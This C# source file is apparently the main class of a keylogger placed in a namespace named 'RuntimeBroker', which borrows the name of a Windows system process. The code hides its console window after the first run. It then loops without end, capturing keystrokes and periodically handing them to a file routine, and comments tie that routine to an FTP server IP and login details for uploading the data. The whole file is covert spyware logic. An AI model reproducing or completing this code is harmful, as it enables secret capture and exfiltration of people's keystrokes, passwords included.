using System;
using System.Threading;

namespace RuntimeBroker
{
    public class Main
    {
        private _file file = new _file();
        private _addons addons = new _addons();
        private _logger log = new _logger();
        internal String ip = ""; // FTP Server IP
        internal String[] credts = {"", ""}; //Login details to FTP (user, pass)
        private bool end = false;
        internal void Main2()
        {
            if (addons.hasRunned()) addons.hideWindow(); //Checking for first run. If not first run, hide console.
            else addons.firstRun(); //Launching if never launched before
            logger();
        }
        private void logger()
        {
            int i = 0;
            while(true)
            {
                i++;
                log.GetBuffKeys();
                if(i == 100000)
                {
                    if (end) Environment.Exit(0);
                    file.decide(this, addons.genFile(), log.getData());
                    log.cleanData();
                    i = 0;
                }
                Thread.Sleep(2);
            }       
        }        
        internal void kill()
        {
            end = true;
        }
    }
}